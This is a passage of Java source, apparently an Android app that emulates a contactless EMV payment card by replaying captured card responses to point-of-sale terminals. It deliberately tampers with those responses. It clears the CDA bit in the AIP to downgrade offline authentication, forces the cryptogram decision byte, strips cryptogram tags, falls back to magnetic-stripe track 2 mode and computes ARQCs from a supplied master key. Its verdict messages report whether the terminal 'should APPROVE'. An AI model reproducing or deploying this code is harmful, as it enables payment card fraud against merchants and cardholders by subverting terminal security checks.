                }
                return cat(raw, SW_OK);
            }
            tap("-- msd field=" + msd + " wins over captured framing=" + capMsd);
        }

        byte[] aip = capturedAip(raw);
        if (aip == null || aip.length < 2) aip = hex(p("aip", DEFAULT_AIP));
        if (aip.length < 2) aip = hex(DEFAULT_AIP);

        byte[] used = new byte[]{aip[0], aip[1]};
        used[0] &= (byte) ~AIP_CDA;
        txnAip = used;

        byte[] a = afl();
        tap("-- gpo msd=" + msd + " aip=" + bytesToHex(used) + " afl=" + bytesToHex(a));

        if (msd) {
            byte[] payload = cat(used, tlv(0x57, track2()));
            tap("-- msd payload: 80" + String.format("%02X", payload.length) + bytesToHex(payload));
            return cat(tlv(0x80, payload), SW_OK);
        }
        return cat(tlv(0x77, cat(tlv(0x82, used), tlv(0x94, a))), SW_OK);
    }

    /**
     * Clear the CDA bit in the AIP of a captured GPO template, in place.
     *
     * FIX: format 1 (outer tag 80) has NO inner TLVs - the payload is two raw
     * AIP bytes followed by the track 2. The old version walked inner TLVs
     * looking for 82, found none, and returned, so the CDA bit survived
     * untouched in MSD mode.
     */
    private static void weakenAip(byte[] tpl) {
        int[] pos = new int[1];
        int outer = readTag(tpl, pos);
        readLen(tpl, pos);

        if (outer == 0x80) {
            if (pos[0] + 2 <= tpl.length) tpl[pos[0]] &= (byte) ~AIP_CDA;
            return;
        }

        int i = pos[0];
        while (i < tpl.length) {
            int[] q = new int[]{i};
            int t = readTag(tpl, q);
            int l = readLen(tpl, q);
            if (q[0] + l > tpl.length) return;
            if (t == 0x82 && l >= 1) {
                tpl[q[0]] &= (byte) ~AIP_CDA;
                return;
            }
            i = q[0] + l;
        }
    }

    /**
     * Overwrite the CID in a captured GPO template, in place.
     *
     * CHANGED: returns null when the template carries no 9F27, rather than
     * appending one. Caller treats null as "leave the template alone".
     *
     * This byte is the whole decision where it exists: the terminal takes the AC
     * from here and never asks for another, so nothing else can influence
     * approve / online / decline.
     */
    private static byte[] forceCid(byte[] tpl, byte cid) {
        int[] pos = new int[1];
        int outer = readTag(tpl, pos);
        int olen  = readLen(tpl, pos);
        int end   = Math.min(tpl.length, pos[0] + olen);

        int i = pos[0];
        while (i < end) {
            int[] q = new int[]{i};
            int t = readTag(tpl, q);
            int l = readLen(tpl, q);
            if (q[0] + l > tpl.length) break;
            if (t == 0x9F27 && l >= 1) {
                tpl[q[0]] = cid;
                return tpl;
            }
            i = q[0] + l;
        }
        return null;
    }

    /**
     * Rebuild a captured GPO template without the tags in GPO_AC_TAGS, so the
     * terminal is left holding only the AIP and the AFL.
     *
     * Only used when STRIP_AC is true. Format 1 is not a template of TLVs - the
     * payload is <AIP 2 bytes> <57 track 2> - so the AIP is copied verbatim and
     * only what follows is walked.
     */
    private static byte[] stripAcTags(byte[] tpl) {
        int[] pos = new int[1];
        int outer = readTag(tpl, pos);
        int olen  = readLen(tpl, pos);
        int end   = Math.min(tpl.length, pos[0] + olen);

        ByteArrayOutputStream out = new ByteArrayOutputStream();

        if (outer == 0x80) {
            if (end - pos[0] < 2) return tpl;
            out.write(tpl, pos[0], 2);
            pos[0] += 2;
        }

        int i = pos[0];
        while (i < end) {
            int[] q = new int[]{i};
            int t = readTag(tpl, q);
            int l = readLen(tpl, q);
            if (q[0] + l > tpl.length) break;
            i = q[0] + l;

            boolean drop = false;
            for (int d : GPO_AC_TAGS) if (d == t) { drop = true; break; }
            if (drop) continue;

            byte[] one = tlv(t, Arrays.copyOfRange(tpl, q[0], q[0] + l));
            out.write(one, 0, one.length);
        }
        return tlv(outer, out.toByteArray());
    }

    /** First value of tag {@code want} inside a template, or null. */
    private static byte[] findTag(byte[] tpl, int want) {
        if (tpl == null || tpl.length < 4) return null;
        int[] pos = new int[1];
        int outer = readTag(tpl, pos);
        if (outer == 0x80) return null;   // format 1 carries no TLVs
        int olen = readLen(tpl, pos);
        int end  = Math.min(tpl.length, pos[0] + olen);

        int i = pos[0];
        while (i < end) {
            int[] q = new int[]{i};
            int t = readTag(tpl, q);
            int l = readLen(tpl, q);
            if (q[0] + l > tpl.length) break;
            if (t == want) return Arrays.copyOfRange(tpl, q[0], q[0] + l);
            i = q[0] + l;
        }
        return null;
    }

    /**
     * FIX: the format 1 branch used raw[2] and raw[3], which is only right for a
     * short-form length. A long-form payload (0x81 xx) put the AIP two bytes
     * further along.
     */
    private byte[] capturedAip(byte[] raw) {
        if (raw == null || raw.length < 4) return null;
        int[] pos = new int[1];
        int outer = readTag(raw, pos);
        if (outer == 0x80) {
            int l = readLen(raw, pos);
            if (l >= 2 && pos[0] + 2 <= raw.length) {
                return Arrays.copyOfRange(raw, pos[0], pos[0] + 2);
            }
            return null;
        }
        int len = readLen(raw, pos);
        int end = Math.min(raw.length, pos[0] + len);
        int i = pos[0];
        while (i < end) {
            int[] q = new int[]{i};
            int t = readTag(raw, q);
            int l = readLen(raw, q);
            if (q[0] + l > raw.length) break;
            if (t == 0x82 && l >= 2) return Arrays.copyOfRange(raw, q[0], q[0] + 2);
            i = q[0] + l;
        }
        return null;
    }

    private byte[] readRecord(int p1, int p2) {
        int sfi = (p2 & 0xFF) >> 3;
        int rec = p1 & 0xFF;

        byte[] captured = rawRec(sfi, rec);
        if (captured != null) {
            tap("-- rec sfi=" + sfi + " rec=" + rec + " (captured)");
            return cat(captured, SW_OK);
        }

        if (sfi == 1) {
            tap("-- rec sfi=1 rec=" + rec + " (synthetic)");
            return cat(syntheticRecord(), SW_OK);
        }

        tap("-- rec miss sfi=" + sfi + " rec=" + rec);
        return SW_NO_RECORD;
    }

    /**
     * The CID box in the editor wins on the FIRST GENERATE AC when it holds a
     * two-digit value, except that an AAC request can never be improved on.
     *
     * Unreachable on this terminal, which never sends GENERATE AC - see gpo().
     * Kept because it is the path back to a genuine online approval once an
     * MK-AC is available.
     *
     * FIX: the flags were tested BEFORE the request, so a terminal asking for
     * AAC (P1 0x00) was handed TC. CID severity runs AAC < ARQC < TC and a card
     * may only answer equal or lower - never better than it was asked.
     */
    private byte[] genac(byte[] apdu) {
        int p1 = apdu[2] & 0xFF;
        int requested = p1 & 0xC0;

        byte cid;
        String forced = p("cid", "").replaceAll("[^0-9A-Fa-f]", "");

        if (cryptogramSent) {
            cid = (requested == 0x00) ? CID_AAC : CID_TC;
        } else if (requested == 0x00) {
            cid = CID_AAC;
        } else if (forced.length() == 2) {
            cid = (byte) Integer.parseInt(forced, 16);
        } else if (ALWAYS_ONLINE_FOR_RECEIPT) {
            cid = CID_ARQC;
        } else if (haveKey() && FORCE_ONLINE_ARQC) {
            cid = CID_ARQC;
        } else if (FORCE_OFFLINE_TC) {
            cid = CID_TC;
        } else if (requested == 0x80) {
            cid = CID_ARQC;
        } else if (requested == 0x40) {
            cid = CID_TC;
        } else {
            cid = CID_TC;
        }

        lastCid = String.format("%02X", cid);
        String atc = txnAtc();

        byte[] cdol = new byte[0];
        int lc = lcOf(apdu);
        int off = dataOff(apdu);
        if (lc > 0 && apdu.length >= off + lc) {
            cdol = Arrays.copyOfRange(apdu, off, off + lc);
        }

        byte[] ac = computeAc(atc, cdol);
        cryptogramSent = true;

        String iad = (capturedIad == null)
                ? p("iad", "06010A03A0B800")
                : bytesToHex(capturedIad);

        tap("-- genac requested=" + String.format("%02X", requested)
                + " cid=" + lastCid
                + (forced.length() == 2 ? " (forced from the CID box)" : "")
                + " atc=" + atc + " arqc=" + bytesToHex(ac));

        return cat(tlv(0x77, cat(
                tlv(0x9F27, new byte[]{cid}),
                tlv(0x9F36, hex(atc)),
                tlv(0x9F26, ac),
                tlv(0x9F10, hex(iad)))), SW_OK);
    }

    private byte[] computeAc(String atc, byte[] cdol) {
        String mk = p("mkac", "").replaceAll("[^0-9A-Fa-f]", "");
        if (mk.length() < 32) {
            tap("!! no MK-AC set - ARQC will be all zeros");
            return new byte[8];
        }
        int variant = 0;
        try {
            String kv = p("keyvar", "0").replaceAll("[^0-9A-Fa-f]", "");
            if (!kv.isEmpty()) {
                variant = kv.matches("[0-9]+")
                        ? Integer.parseInt(kv)
                        : Integer.parseInt(kv, 16);
            }
        } catch (Exception ignored) { }
        variant &= 0x03;

        try {
            byte[] macIn = ((variant & 2) != 0)
                    ? cat(aipForMac(), hex(atc), cdol)
                    : cat(cdol, aipForMac(), hex(atc));
            return EmvCrypto.arqc(mk, pan(), psn(), atc, macIn, variant & 1);
        } catch (Exception e) {
            tap("!! ARQC failed: " + e);
            return new byte[8];
        }
    }

    private byte[] getData(byte[] apdu) {
        int tag = ((apdu[2] & 0xFF) << 8) | (apdu[3] & 0xFF);

        if (tag == 0x9F36)      return cat(tlv(0x9F36, hex(txnAtc())), SW_OK);
        else if (tag == 0x9F13) return cat(tlv(0x9F13, hex("00")), SW_OK);
        else if (tag == 0x9F17) return cat(tlv(0x9F17, hex("00")), SW_OK);
        else if (tag == 0x9F4F) return cat(tlv(0x9F4F, hex("9F4D020B0A")), SW_OK);
        return SW_NOT_FOUND;
    }

    /**
     * Built from counters, not from searching the log text.
     *
     * FIX: the "AC came out of the GPO" branch used to run before the record
     * count, so a terminal that bailed at the GPO and one that read every record
     * then went online produced the identical verdict. They are different
     * faults. The record count is now tested first.
     */
    private String baseVerdict() {
        if (sawError)     return "TAP: an APDU threw - read the !! line, not the AID list";
        if (tapLog.length() == 0) return "TAP: nothing recorded";

        if (!sawPpse)     return "TAP: terminal never asked for the directory - it never read the phone";
        if (nSelects <= 1) return "TAP: terminal read the directory then stopped - it found no AID it supports";
        if (nGpos == 0)   return "TAP: terminal picked an app then stopped - it rejected the FCI";

        if (isMsd()) {
            if (nGens == 0)          return "TAP: MSD mode - terminal took the track 2 and decided on its own";
            if (nGens >= 2)          return "TAP: MSD mode - terminal WENT ONLINE";
            if ("40".equals(lastCid)) return "TAP: MSD mode - we answered TC, terminal should APPROVE";
            if ("80".equals(lastCid)) return "TAP: MSD mode - we answered ARQC, terminal must go online";
            if ("00".equals(lastCid)) return "TAP: MSD mode - we answered AAC, terminal read it as a decline";
            return "TAP: MSD mode - terminal asked for a cryptogram and we did not answer TC";
        }

        if (nRecs == 0) {
            return "TAP: terminal took the GPO response and read NO records - "
                    + (gpoCid.isEmpty()
                        ? "check the logged AFL"
                        : "the AC in the GPO (cid " + gpoCid + ") did not satisfy it");
        }

        if (nGens == 0 && !gpoCid.isEmpty()) {
            return "TAP: terminal read " + nRecs + " records and never sent GENERATE AC -"
                    + " the AC came out of the GPO response (cid " + gpoCid
                    + ") so it went online with it rather than asking us";
        }

        if (nGens == 0)   return "TAP: terminal read " + nRecs + " records then quit before the cryptogram";
        if (nGens >= 2)   return "TAP: terminal WENT ONLINE - the issuer judged our ARQC";
        if ("40".equals(lastCid)) return "TAP: we answered TC - terminal should have APPROVED offline";
        if ("80".equals(lastCid)) return "TAP: we answered ARQC - terminal must go online";
        if ("00".equals(lastCid)) return "TAP: we answered AAC - terminal treated it as an offline decline";
        return "TAP: terminal asked for a cryptogram and we did not answer TC";
    }

    private String verdict() {
        String v = baseVerdict();
        int armed = scriptLines();
        if (armed == 0) return v;
        if (!useScript()) return v + " | script armed " + armed + " line(s) but OFF";
        if (scriptHits > 0) return v + " | script hit " + scriptHits + "x";
        return v + " | script armed " + armed + " line(s) but never matched";
    }

    @Override
    public void onDeactivated(int reason) {
        final String t = tapLog.toString();

        String v;
        try {
            v = verdict();
        } catch (Exception e) {
            v = "TAP: verdict failed - " + e;
        }
        resetTransaction();

        if (!t.isEmpty()) termLog("!! verdict: " + v);

        if (!t.isEmpty()) {
            try {
                ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                if (cm != null) cm.setPrimaryClip(ClipData.newPlainText("tap log", t));
            } catch (Exception ignored) { }
            try {
                prefs().edit().putString("taplog", t).putString("lastverdict", v).apply();
            } catch (Exception ignored) { }
            popup(v);
        }
        Log.d(TAG, "onDeactivated reason=" + reason + " | " + v);
    }
}
